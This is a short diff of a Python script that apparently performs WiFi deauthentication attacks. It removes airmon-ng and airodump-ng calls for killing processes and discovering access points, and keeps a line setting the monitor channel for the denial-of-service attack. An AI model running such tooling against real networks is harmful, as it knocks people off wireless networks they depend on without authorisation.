@@ -12,23 +12,6 @@ from scapy.layers.l2 import ARP, Ether
 #hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
 def deautentication_user( hacknic , hackbssid ,hackchannel):
 
-    # Kill conflicting WiFi processses
-    print("WiFi adapter connected!\nNow let's kill conflicting processes:")
-
-    # subprocess.run(<list of command line arguments goes here>)
-    # The script is the parent process and creates a child process which runs the system command, and will only continue once the child process has completed.
-    # We run the iwconfig command to look for wireless interfaces.
-    # Killing all conflicting processes using airmon-ng
-    kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])
-
-
-    # subprocess.Popen(<list of command line arguments goes here>)
-    # The Popen method opens a pipe from a command. The output is an open file that can be accessed by other programs.
-    # We run the iwconfig command to look for wireless interfaces.
-    # Discover access points
-    discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-
     # Change to the channel we want to perform the DOS attack on.
     # Monitoring takes place on a different channel and we need to set it to that channel.
     subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
